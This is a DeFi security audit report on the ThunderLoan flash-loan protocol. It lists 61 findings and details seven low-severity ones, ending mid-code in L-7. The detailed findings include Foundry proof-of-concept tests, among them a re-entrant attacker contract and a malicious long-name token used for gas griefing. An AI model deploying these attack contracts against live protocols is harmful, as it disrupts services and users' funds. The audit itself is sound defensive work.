# 6 thunder loan audit - Findings Report
## Commit hash: 2250d81b89aebdd9cb135382e068af8c269e3a4b

## Protocol Overview 

### ThunderLoan Protocol  
ThunderLoan is an upgradeable DeFi system that offers zero-collateral flash loans while letting liquidity providers earn yield. The core `ThunderLoan`/`ThunderLoanUpgraded` contracts pool ERC-20 liquidity, issue interest-bearing `AssetToken`s, and manage loans, fees, and upgrades via OpenZeppelin’s UUPS pattern.  

#### Participants  
• **Liquidity Provider** – deposits an allowed token; the contract mints an `AssetToken` that grows in value as fees accrue.  
• **Borrower** – calls `flashloan`, receives tokens, executes arbitrary logic, and must return `amount + fee` within the same transaction through `IFlashLoanReceiver.executeOperation`.  
• **Owner** – may add/remove allowed tokens, tune the fee, and authorize contract upgrades.  

#### Mechanics  
1. **Deposit**: `deposit(token, amount)` transfers underlying into the pool and mints proportional `AssetToken`s at the current exchange rate.  
2. **Flash Loan**: Contract marks the token as “in loan”, sends funds, collects repayment via `repay`, verifies fee, then updates the exchange rate so all `AssetToken` holders share the earnings.  
3. **Redeem**: Holder burns `AssetToken`s via `redeem` to withdraw the corresponding share of underlying.  
4. **Pricing & Fees**: A pool-factory oracle returns token prices in WETH; a fee (default 0.3%, `1e18` precision) is computed per loan.  

All logic is modular, permissioned, and secured with extensive custom errors and OpenZeppelin libraries, enabling safe, maintainable flash-loan liquidity markets.
## High Risk Findings
[H-1]. Reentrancy issue found with High severity
[H-2]. Storage Layout issue found with High severity
[H-3]. Upgradeability Initializer Safety issue found with High severity
[H-4]. Storage Layout issue found with High severity
[H-5]. Integer Overflow/Math issue found with High severity
[H-6]. Flash Loan Economic Manipulation issue found with High severity
[H-7]. Integer Overflow/Math issue found with High severity
[H-8]. Integer Overflow/Math issue found with High severity
[H-9]. Storage Layout issue found with High severity
[H-10]. DOS issue found with High severity
[H-11]. Flash Loan Economic Manipulation issue found with High severity
## Medium Risk Findings
[M-1]. DOS issue found with Medium severity
[M-2]. Storage Layout issue found with Medium severity
[M-3]. Oracle issue found with Medium severity
[M-4]. Integer Overflow/Math issue found with Medium severity
[M-5]. Integer Overflow/Math issue found with Medium severity
[M-6]. Integer Overflow/Math issue found with Medium severity
[M-7]. Integer Overflow/Math issue found with Medium severity
[M-8]. Integer Overflow/Math issue found with Medium severity
[M-9]. Flash Loan Economic Manipulation issue found with Medium severity
[M-10]. Upgradeability Initializer Safety issue found with Medium severity
[M-11]. Oracle issue found with Medium severity
[M-12]. Oracle issue found with Medium severity
[M-13]. DOS issue found with Medium severity
[M-14]. Integer Overflow/Math issue found with Medium severity
[M-15]. Pausable Emergency Stop issue found with Medium severity
[M-16]. Oracle issue found with Medium severity
[M-17]. Flash Loan Economic Manipulation issue found with Medium severity
[M-18]. Storage Layout issue found with Medium severity
[M-19]. Reentrancy issue found with Medium severity
## Low Risk Findings
[L-1]. DOS issue in AssetToken::updateExchangeRate
[L-2]. Gas Grief BlockLimit issue in ThunderLoan::setAllowedToken
[L-3]. Pausable Emergency Stop issue in ThunderLoan::NA
[L-4]. Integer Overflow/Math issue in ThunderLoan::deposit
[L-5]. Reentrancy issue in ThunderLoan::flashloan
[L-6]. Pausable Emergency Stop issue in ThunderLoan::NA
[L-7]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[L-8]. DOS issue in AssetToken::updateExchangeRate
[L-9]. Pausable Emergency Stop issue in ThunderLoanUpgraded::NA
[L-10]. Integer Overflow/Math issue in ThunderLoanUpgraded::getCalculatedFee
[L-11]. Reentrancy issue in ThunderLoanUpgraded::flashloan
[L-12]. DOS issue in AssetToken::updateExchangeRate
[L-13]. Integer Overflow/Math issue in ThunderLoan::deposit
[L-14]. Integer Overflow/Math issue in AssetToken::updateExchangeRate
[L-15]. Unchecked Return issue in ThunderLoan::flashloan
[L-16]. Integer Overflow issue in ThunderLoan::redeem
[L-17]. Integer Overflow issue in ThunderLoan::redeem(IERC20,uint256)
[L-18]. Reentrancy issue in ThunderLoan::flashloan(address,IERC20,uint256,bytes)
## Info Risk Findings
[I-1]. Event Consistency issue in ThunderLoan::updateFlashLoanFee
[I-2]. Pragma issue in ThunderLoan::NA
[I-3]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit
[I-4]. Pragma issue in AssetToken::NA
[I-5]. Unexpected Eth issue in ThunderLoan::NA
[I-6]. Event Consistency issue in ThunderLoanUpgraded::updateFlashLoanFee
[I-7]. Event Consistency issue in ThunderLoanUpgraded::repay
[I-8]. Unexpected Eth issue in ThunderLoanUpgraded::NA
[I-9]. Pragma issue in OracleUpgradeable::NA
[I-10]. Event Consistency issue in AssetToken::updateExchangeRate
[I-11]. Unexpected Eth issue in ThunderLoan::NA
[I-12]. Storage Layout issue in ThunderLoanUpgraded::NA
[I-13]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit(IERC20,uint256)


### Number of Findings
- H: 11
- M: 19
- L: 18
- I: 13



# Low Risk Findings

## [L-1]. DOS issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function calculates a new rate with the formula `s_exchangeRate * (totalSupply() + fee) / totalSupply()`. This function is called by `ThunderLoan.flashloan`. The flashloan logic correctly checks if the underlying token balance is sufficient, but it does not require any `AssetToken`s to have been minted. If a pool has liquidity (e.g., from a direct transfer to the `AssetToken` contract) but has a `totalSupply()` of zero, any attempt to take a flash loan will cause a division-by-zero revert, making flash loans for that asset permanently unavailable until a deposit is made via the `deposit` function.

## Impact
This creates a Denial of Service (DoS) vector for the flash loan functionality of any given token pool. Users will be unable to take flash loans from a pool that has underlying assets but no minted `AssetToken`s, breaking a core feature of the protocol for that asset.

## Proof of Concept
1. The owner calls `setAllowedToken` to list a new token, creating an `AssetToken` contract for it.
2. A user, or the protocol itself, transfers a large amount of the underlying token directly to the `AssetToken` contract address. The `AssetToken` now has a balance to lend, but its `totalSupply` is zero.
3. A borrower attempts to take a flash loan of these tokens by calling `ThunderLoan.flashloan`.
4. The `flashloan` function calls `assetToken.updateExchangeRate(fee)` before lending the tokens.
5. The call to `updateExchangeRate` reverts with a division-by-zero error because `totalSupply()` is 0.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {FlashLoanReceiver} from "./mocks/FlashLoanReceiver.sol";

// Using Mocks from previous PoC
contract MockTSwapPoolDos is Test {
    function getPriceOfOnePoolTokenInWeth() external pure returns (uint256) { return 1e18; }
}
contract MockPoolFactoryDos is Test {
    mapping(address => address) public pools;
    function addPool(address token, address pool) external { pools[token] = pool; }
    function getPool(address token) external view returns (address) { return pools[token]; }
}

contract DivisionByZeroTest is Test {
    ThunderLoan internal thunderLoan;
    MockERC20 internal weth;
    AssetToken internal assetToken;

    address internal owner = makeAddr("owner");
    address internal user = makeAddr("user");

    function setUp() public {
        vm.prank(owner);
        ThunderLoan implementation = new ThunderLoan();

        MockPoolFactoryDos poolFactory = new MockPoolFactoryDos();
        MockTSwapPoolDos tSwapPool = new MockTSwapPoolDos();
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        poolFactory.addPool(address(weth), address(tSwapPool));

        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(poolFactory));
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), data);
        thunderLoan = ThunderLoan(address(proxy));

        vm.prank(owner);
        thunderLoan.setAllowedToken(weth, true);
        assetToken = thunderLoan.getAssetFromToken(weth);
    }

    function test_DoS_divisionByZeroInFlashloan() public {
        // 1. Provide liquidity directly to AssetToken contract, bypassing deposit()
        uint256 directLiquidity = 100 ether;
        weth.mint(user, directLiquidity);
        vm.prank(user);
        weth.transfer(address(assetToken), directLiquidity);

        // AssetToken has funds, but no shares have been minted
        assertEq(weth.balanceOf(address(assetToken)), directLiquidity);
        assertEq(assetToken.totalSupply(), 0);

        // 2. Attempt to take a flash loan
        FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver(address(thunderLoan), weth);
        uint256 flashLoanAmount = 50 ether;
        bytes memory params = abi.encode(flashLoanAmount);

        // Expect a revert due to division by zero
        vm.expectRevert(); // Catches arithmetic overflow/underflow, including division by zero
        vm.prank(user);
        thunderLoan.flashloan(address(flashLoanReceiver), weth, flashLoanAmount, params);
    }
}
```

## Suggested Mitigation
In the `AssetToken.updateExchangeRate` function, add a check to ensure `totalSupply()` is not zero before performing the division. If there is no supply, there are no LPs to distribute fees to, so the exchange rate update can be safely skipped.

```solidity
// In AssetToken.sol -> updateExchangeRate function
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    if (totalSupply() == 0) {
        return; // No LPs to distribute fees to, so no rate update
    }
    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;

    emit ExchangeRateUpdated(s_exchangeRate);
}
```

## [L-2]. Gas Grief BlockLimit issue in ThunderLoan::setAllowedToken

## Description
The owner-only `setAllowedToken` function creates a new `AssetToken` contract. The name and symbol for this new token are created by concatenating a prefix with the name and symbol from the user-provided underlying token contract. A malicious user could create an ERC20 token with an extremely long name or symbol. If the owner is tricked into allowing this token, the `string.concat` operation would consume a very large amount of gas, potentially exceeding the block gas limit and causing the transaction to fail. This is a gas griefing/DoS attack vector against an administrative function.

## Impact
An attacker can prevent the owner from adding new tokens by tricking them into calling `setAllowedToken` with a malicious token. The transaction would fail, but the owner would still pay for the gas consumed up to the point of failure. This disrupts the administration and expansion of the protocol.

## Proof of Concept
contract MaliciousLongNameToken is IERC20Metadata {
    /* --- only the functions actually used by ThunderLoan are implemented --- */
    function name() external pure override returns (string memory) {
        // return a 50 000-byte string (≈ 50 KB)
        bytes memory str = new bytes(50000);
        for (uint256 i; i < 50000; ++i) {
            str[i] = bytes1(uint8(0x61)); // "a"
        }
        return string(str);
    }

    function symbol() external pure override returns (string memory) {
        return "MAL";
    }

    function decimals() external pure override returns (uint8) { return 18; }

    /* --- dummy implementations to satisfy the rest of IERC20 --- */
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return false; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function approve(address, uint256) external pure returns (bool) { return false; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return false; }
}

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "../../src/protocol/ThunderLoan.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IPoolFactory} from "../../src/interfaces/IPoolFactory.sol";

/* ─────────────────────────────────  Helpers  ─────────────────────────────── */
contract DummyPoolFactory is IPoolFactory {
    function getPool(address) external pure returns (address) { return address(0); }
}

contract MaliciousLongNameToken is IERC20Metadata {
    function name() external pure override returns (string memory) {
        bytes memory str = new bytes(50000);
        for (uint256 i; i < 50000; ++i) str[i] = bytes1(uint8(0x61));
        return string(str);
    }
    function symbol() external pure override returns (string memory) { return "MAL"; }
    function decimals() external pure override returns (uint8) { return 18; }
    /* IERC20 no-ops */
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return false; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function approve(address, uint256) external pure returns (bool) { return false; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return false; }
}

contract GasGriefingTest is Test {
    ThunderLoan private loan;
    address private owner = address(0xABCD);

    function setUp() public {
        vm.startPrank(owner);
        ThunderLoan impl = new ThunderLoan();
        bytes memory init = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(new DummyPoolFactory()));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), init);
        loan = ThunderLoan(address(proxy));
        vm.stopPrank();
    }

    function test_setAllowedToken_reverts_with_OOG() public {
        MaliciousLongNameToken mal = new MaliciousLongNameToken();
        vm.startPrank(owner);
        // Supply only 5M gas – well below the >20M needed for copying a 50KB string
        vm.expectRevert();
        loan.setAllowedToken{gas: 5_000_000}(IERC20(address(mal)), true);
        vm.stopPrank();
    }
}

## Suggested Mitigation
Before concatenating, bound-check the length of `IERC20Metadata.name()` and `symbol()`. For example:

```solidity
string memory n = IERC20Metadata(address(token)).name();
string memory s = IERC20Metadata(address(token)).symbol();
require(bytes(n).length <= 64 && bytes(s).length <= 16, "ThunderLoan: name/symbol too long");
```

## [L-3]. Pausable Emergency Stop issue in ThunderLoan::NA

## Description
The protocol does not have a global emergency stop (pause) mechanism. In the event of a critical vulnerability discovery, the owner's only recourse is to disable affected token pools one by one via `setAllowedToken(token, false)`. This process is slow, requires multiple transactions, and creates a window of opportunity for attackers to exploit the vulnerability on still-active pools. A global pause function would allow the owner to halt all critical functions (`deposit`, `redeem`, `flashloan`) in a single transaction, providing a much more effective incident response.

## Impact
In the case of a critical bug, the inability to swiftly pause the protocol can lead to a partial or total loss of user funds. The delay in disabling pools individually creates a race condition between the owner and attackers.

## Proof of Concept
1. A critical bug is found in the `redeem` function that allows users to withdraw more funds than they deposited.
2. The protocol has 10 active token pools.
3. An attacker creates 10 bots, one for each pool, and starts draining funds.
4. The owner is notified and starts calling `setAllowedToken(token, false)` for each pool. Each transaction takes time to be mined.
5. While the owner is disabling the first few pools, the attacker's bots continue to drain funds from the remaining active pools.
6. A significant amount of funds is stolen before the owner can disable all 10 pools. A single `pause()` transaction would have prevented this.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";

// This PoC is conceptual and describes the scenario. A code PoC would require
// simulating a vulnerability and a race condition, which is complex.
// The core of the finding is the *absence* of a feature, not an exploitable bug in existing code.

contract PausableTest is Test {
    function test_conceptual_lackOfPause() public {
        // SCENARIO:
        // 1. Assume a bug in ThunderLoan.redeem() allows withdrawing more than deposited.
        // 2. The protocol has two active pools: WETH and DAI.
        // 3. Attacker starts draining both pools.

        // address owner = ...;
        // ThunderLoan thunderLoan = ...;
        // IERC20 weth = ...;
        // IERC20 dai = ...;

        // Owner must submit two separate transactions to stop the drain.
        // Tx 1: vm.prank(owner); thunderLoan.setAllowedToken(weth, false);
        // -- DRAIN CONTINUES ON DAI POOL WHILE TX 1 IS MINING --

        // Tx 2: vm.prank(owner); thunderLoan.setAllowedToken(dai, false);
        // -- DRAIN ON WETH IS STOPPED, DRAIN ON DAI STOPS AFTER TX 2 IS MINED --

        // If a pause function existed:
        // vm.prank(owner); thunderLoan.pause();
        // -- ALL ACTIVITY ON ALL POOLS STOPS AFTER ONE TRANSACTION --

        assertTrue(true, "Conceptual PoC: Lack of a global pause function creates a race condition during incident response.");
    }
}
```

## Suggested Mitigation
Integrate OpenZeppelin's `PausableUpgradeable` contract to add a global pause mechanism. Apply the `whenNotPaused` modifier to all critical functions that involve fund movements or state changes initiated by non-admin users.

```solidity
// In ThunderLoan.sol
import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";

contract ThunderLoan is Initializable, UUPSUpgradeable, OwnableUpgradeable, ContextUpgradeable, OracleUpgradeable, PausableUpgradeable {
    // ... existing code ...

    function initialize(address tswapAddress) public override initializer {
        // ... existing initializers ...
        __Pausable_init();
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    function deposit(IERC20 token, uint256 amount) external override whenNotPaused /* ... */ {
        // ...
    }

    function redeem(IERC20 token, uint256 amountOfAssetToken) external override whenNotPaused /* ... */ {
        // ...
    }

    function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external override whenNotPaused /* ... */ {
        // ...
    }
}
```

## [L-4]. Integer Overflow/Math issue in ThunderLoan::deposit

## Description
The `deposit` function calculates the amount of `AssetToken` to mint based on the deposited amount and the current exchange rate. Due to integer division, if a user deposits a small `amount` of an underlying token when the `exchangeRate` is high, the calculated `mintAmount` can round down to zero. The function proceeds to transfer the user's tokens but mints no `AssetToken`s in return, causing a complete loss of the deposited funds for that user. The funds are effectively donated to the other liquidity providers in the pool.

Vulnerable Code Snippet in `ThunderLoan.sol`:
```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    // ...
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;

    emit Deposit(msg.sender, token, amount);

    assetToken.mint(msg.sender, mintAmount); // mintAmount can be 0
    // ...
    token.safeTransferFrom(msg.sender, address(assetToken), amount); // User's funds are transferred regardless
}
```

## Impact
A user who deposits an amount smaller than EXCHANGE_RATE_PRECISION / currentExchangeRate will have all of his tokens transferred to the pool while receiving zero AssetTokens. The loss is limited to the user’s own deposit and does not threaten existing liquidity, but it represents an unexpected, irreversible donation to the pool.

## Proof of Concept
1. Initial LP deposits 1_000 ether of WETH.
2. We impersonate the ThunderLoan contract in the test and call `updateExchangeRate` with a fee equal to the current totalSupply (1_000 ether).  Exchange-rate doubles from 1e18 to 2e18.
3. A victim deposits 1 wei of WETH.
4. Because 1 * 1e18 / 2e18 == 0, no AssetTokens are minted while the wei is transferred to the pool.
5. Victim’s WETH decreases, AssetToken balance stays zero; pool balance increases by 1 wei.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockTSwapPool} from "./mocks/MockTSwapPool.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";

contract DepositRoundingTest is Test {
    ThunderLoan tl;
    MockERC20 weth;
    AssetToken aWETH;
    address owner = makeAddr("owner");
    address lp     = makeAddr("lp");
    address victim = makeAddr("victim");

    function setUp() public {
        vm.prank(owner);
        tl = new ThunderLoan();

        // mock token & price infra
        weth = new MockERC20("Wrapped Ether","WETH",18);
        MockTSwapPool pool = new MockTSwapPool();
        pool.setPrice(1e18);
        MockPoolFactory pf = new MockPoolFactory();
        pf.setPool(address(weth), address(pool));

        vm.prank(owner);
        tl.initialize(address(pf));

        // allow WETH
        vm.prank(owner);
        aWETH = AssetToken(tl.setAllowedToken(weth, true));

        // provide initial liquidity
        weth.mint(lp, 1_000 ether);
        vm.startPrank(lp);
        weth.approve(address(tl), 1_000 ether);
        tl.deposit(weth, 1_000 ether);
        vm.stopPrank();

        // simulate protocol fee so that exchange-rate doubles
        vm.prank(address(tl)); // impersonate ThunderLoan (bypasses onlyThunderLoan)
        aWETH.updateExchangeRate(1_000 ether);
        assertEq(aWETH.getExchangeRate(), 2e18, "rate doubled");
    }

    function test_RoundingDepositLosesFunds() public {
        // victim has 1 wei
        weth.mint(victim, 1);
        uint256 victimWethBefore   = weth.balanceOf(victim);
        uint256 victimAssetBefore  = aWETH.balanceOf(victim);
        uint256 poolBalanceBefore  = weth.balanceOf(address(aWETH));

        vm.startPrank(victim);
        weth.approve(address(tl), 1);
        tl.deposit(weth, 1);
        vm.stopPrank();

        assertEq(aWETH.balanceOf(victim), victimAssetBefore, "no AssetTokens minted");
        assertEq(weth.balanceOf(victim), victimWethBefore - 1, "victim WETH decreased");
        assertEq(weth.balanceOf(address(aWETH)), poolBalanceBefore + 1, "pool received tokens");
    }
}

## Suggested Mitigation
Revert the transaction when `mintAmount == 0` (e.g. `if (mintAmount == 0) revert ThunderLoan__DepositAmountTooLow();`). This guarantees that every successful deposit mints at least 1 AssetToken and avoids silent loss of funds for small deposits.

## [L-5]. Reentrancy issue in ThunderLoan::flashloan

## Description
The `ThunderLoan.flashloan` function does not implement a reentrancy guard. An attacker can make a re-entrant call to `flashloan` for the same token from within the `executeOperation` callback. The inner (re-entrant) call will complete its execution first, which includes setting `s_currentlyFlashLoaning[token]` to `false`. When control returns to the outer `flashloan` call, its state-tracking flag is already `false`, even though the loan is still active. This corrupts the protocol's state and can break other logic that depends on this flag, such as the `repay` function, which will revert if called when the flag is unexpectedly `false`.

## Impact
A borrower can nest flash-loan calls for the same token. During the outer call the `s_currentlyFlashLoaning[token]` flag is momentarily cleared by the inner call, so subsequent calls to the convenience function `repay()` (inside the same transaction) will revert with `ThunderLoan__NotCurrentlyFlashLoaning`. No funds can be stolen, lost or locked and the flag is restored to its correct value (`false`) once the outer flash-loan finishes. The impact is limited to disrupting the helper `repay()` flow within the same tx.

## Proof of Concept
1. An attacker creates a contract that implements `IFlashLoanReceiver`.
2. The attacker's contract calls `ThunderLoan.flashloan()`.
3. Inside its `executeOperation` callback, the attacker's contract calls `ThunderLoan.flashloan()` again for the same token.
4. The inner flash loan executes, and upon completion, sets `s_currentlyFlashLoaning` for the token to `false`.
5. Control returns to the outer `executeOperation` call. The `s_currentlyFlashLoaning` flag is now `false`, even though the initial loan is not yet complete. Any logic in the attacker's contract that relies on this flag (e.g., calling `repay`) will now fail.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IPoolFactory} from "../src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "../src/interfaces/ITSwapPool.sol";

// Mocks from previous test
contract MockTSwapPool is ITSwapPool { function getPriceOfOnePoolTokenInWeth() external view override returns (uint256) {return 1e18;}}
contract MockPoolFactory is IPoolFactory { mapping(address => address) private s_pools; function setPool(address token, address pool) external { s_pools[token] = pool; } function getPool(address token) external view override returns (address) { return s_pools[token]; }}

contract ReentrancyAttacker is IFlashLoanReceiver {
    ThunderLoan public immutable i_thunderLoan;
    ERC20Mock public immutable i_token;
    bool private reentered = false;
    bool public stateWasCorrupted = false;

    constructor(ThunderLoan thunderLoan, ERC20Mock token) {
        i_thunderLoan = thunderLoan;
        i_token = token;
    }

    function attack(uint256 amount) external {
        i_thunderLoan.flashloan(address(this), IERC20(i_token), amount, "");
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address, bytes calldata) external override returns (bool) {
        if (!reentered) {
            reentered = true;

            // Re-enter flashloan
            i_thunderLoan.flashloan(address(this), IERC20(i_token), amount, "");

            // Check the state after the re-entrant call has finished.
            // The inner call sets s_currentlyFlashLoaning to false, corrupting the state for this outer call.
            if (!i_thunderLoan.isCurrentlyFlashLoaning(IERC20(i_token))) {
                stateWasCorrupted = true;
            }
        }
        
        // Repay the loan
        i_token.transfer(address(i_thunderLoan.getAssetFromToken(IERC20(i_token))), amount + fee);
        return true;
    }
}

contract ReentrancyTest is Test {
    ThunderLoan internal thunderLoan;
    ERC20Mock internal weth;

    function setUp() public {
        weth = new ERC20Mock();
        MockPoolFactory factory = new MockPoolFactory();
        MockTSwapPool pool = new MockTSwapPool();
        factory.setPool(address(weth), address(pool));
        ThunderLoan implementation = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), abi.encodeWithSelector(ThunderLoan.initialize.selector, address(factory)));
        thunderLoan = ThunderLoan(address(proxy));
        
        // Provide liquidity
        weth.mint(address(this), 1000e18);
        thunderLoan.setAllowedToken(IERC20(weth), true);
        weth.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(IERC20(weth), 1000e18);
    }

    function testReentrancy() public {
        uint256 loanAmount = 100e18;
        ReentrancyAttacker attacker = new ReentrancyAttacker(thunderLoan, weth);
        weth.mint(address(attacker), 2e18); // Provide gas funds for fees
        
        attacker.attack(loanAmount);

        assertTrue(attacker.stateWasCorrupted(), "Re-entrant call did not corrupt the s_currentlyFlashLoaning state");
    }
}
```

## Suggested Mitigation
If nested flash-loans are not a desired feature, add a check at the beginning of `flashloan` that reverts when `s_currentlyFlashLoaning[token]` is already `true` or use a simple re-entrancy guard. If nested loans must remain possible, change `s_currentlyFlashLoaning` from a bool to a uint256 counter and make `repay()` succeed when the counter is > 0.

## [L-6]. Pausable Emergency Stop issue in ThunderLoan::NA

## Description
The `ThunderLoan` contract manages user funds and critical financial operations like deposits, redemptions, and flash loans. However, it lacks a pausable or emergency stop mechanism. In the event a critical vulnerability is discovered (e.g., an inflation bug in `redeem` or a fee bypass in `flashloan`), there is no way for the owner to swiftly halt protocol activities. The only available action is a contract upgrade via the UUPS pattern, which can be a slow process involving developing, testing, and deploying a new implementation. This delay provides a window for attackers to exploit the vulnerability and drain funds.

## Impact
Lacking a circuit-breaker increases the blast-radius of any future undiscovered bug because the owner cannot halt operations while an upgrade is prepared. No funds are immediately at risk in the current code-path; the issue only amplifies damage from other yet-unknown bugs.

## Proof of Concept
1. A white-hat hacker discovers a flaw in the `redeem` function that allows a user to withdraw more underlying assets than their `AssetToken` balance should permit.
2. The hacker privately reports the issue to the protocol team.
3. Before the team can deploy an upgraded contract, a black-hat attacker independently discovers and begins to exploit the same vulnerability.
4. The protocol starts losing funds rapidly.
5. The team is unable to stop the ongoing attack because there is no `pause` function. They can only watch as funds are drained while they rush to deploy a fix.
6. If a pause mechanism existed, the owner could have immediately called `pause()` upon receiving the report, freezing all `deposit` and `redeem` activity and preventing any financial loss.

## Proof of Code
A code-based proof of concept is not applicable as this finding relates to the *absence* of a security feature. The proof is the lack of a pausable mechanism in the `ThunderLoan.sol` contract. A test could demonstrate a hypothetical exploit that would be preventable with a pause function, but the core issue is the missing code itself.

## Suggested Mitigation
Consider inheriting OpenZeppelin’s PausableUpgradeable and gating critical state-changing functions with whenNotPaused. Expose pause()/unpause() to the owner so that the protocol can be frozen quickly if another vulnerability is discovered.

## [L-7]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `updateExchangeRate` function in `AssetToken` calculates the new exchange rate after a fee is collected. This function is called from `ThunderLoan.deposit` after new shares have already been minted for the depositor. The formula used is `newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply()`. Both instances of `totalSupply()` refer to the new total supply, which includes the shares of the new depositor. This is incorrect because the deposit fee, paid by the new depositor, should accrue value only to the shareholders that existed *before* this deposit. By including the new depositor's shares in the calculation, their fee is distributed across all shareholders, including themselves, effectively diluting the reward for existing liquidity providers.

## Impact
The mis-calculation allows every new depositor to receive part (or all) of the deposit-fee back, while existing liquidity-providers earn less than the fee they should have received. In the extreme case where the pool size is very small, almost the entire fee is given back to the depositor, meaning the protocol practically charges no deposit fees and long-term LP revenue is systematically reduced.

## Proof of Concept
1. LP1 deposits 1000 WETH into an empty pool. After a deposit fee, they receive 997 AssetTokens. The exchange rate is updated to reflect this fee, increasing its value slightly.
2. A flash loan occurs, generating a fee that correctly accrues to LP1, further increasing the exchange rate.
3. LP2 deposits 1000 WETH. A deposit fee of 3 WETH is charged.
4. `ThunderLoan` mints new shares for LP2 based on the current exchange rate.
5. `ThunderLoan` then calls `assetToken.updateExchangeRate(3e18)` to account for the fee.
6. The `updateExchangeRate` function uses the `totalSupply()` *after* LP2's shares have been added. 
7. As a result, the rate increase from the 3 WETH fee is spread across both LP1's and LP2's shares.
8. The correct behavior would be for the rate to increase based on the `totalSupply()` *before* LP2's deposit, ensuring the entire fee benefits only LP1. The flawed calculation results in a lower exchange rate than the correct one, causing a direct value loss for LP1.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Mock.sol";
import "../../src/protocol/AssetToken.sol";

// A minimal contract that plays the role of ThunderLoan so it can call the restricted functions
contract AssetTokenHarness is AssetToken {
    constructor(IERC20 _underlying)
        AssetToken(address(this), _underlying, "AST", "AST")
    {}
    function mintShares(address to, uint256 amount) external {
        AssetToken.mint(to, amount);
    }
    function updateRate(uint256 fee) external {
        AssetToken.updateExchangeRate(fee);
    }
}

contract ExchangeRateDilutionTest is Test {
    ERC20Mock private weth;
    AssetTokenHarness private asset;
    address private lp1 = address(0xA1);
    address private lp2 = address(0xB2);

    function setUp() public {
        weth = new ERC20Mock("Wrapped Ether", "WETH", lp1, 0);
        asset = new AssetTokenHarness(IERC20(weth));
    }

    function testFeeDilution() public {
        uint256 PRECISION = asset.EXCHANGE_RATE_PRECISION();

        // --- LP1 deposit ----------------------------------------------------
        uint256 lp1Shares = 997 ether; // mimics 1000 – 0.3 % fee
        asset.mintShares(lp1, lp1Shares);
        asset.updateRate(3 ether);       // fee credited *after* mint
        uint256 rateAfterLp1 = asset.getExchangeRate();
        uint256 supplyAfterLp1 = asset.totalSupply();

        // --- flash-loan accrues 1 ether fee ---------------------------------
        asset.updateRate(1 ether);
        uint256 rateAfterLoan = asset.getExchangeRate();

        // --- LP2 deposit ----------------------------------------------------
        uint256 supplyBeforeLp2 = asset.totalSupply();
        uint256 lp2Shares = 997 ether;
        asset.mintShares(lp2, lp2Shares);   // new shares already minted
        asset.updateRate(3 ether);          // same 0.3 % fee, but now diluted
        uint256 vulnerableRate = asset.getExchangeRate();

        // what the rate **should** have been (using supplyBeforeLp2)
        uint256 correctRate = (rateAfterLoan * (supplyBeforeLp2 + 3 ether)) / supplyBeforeLp2;

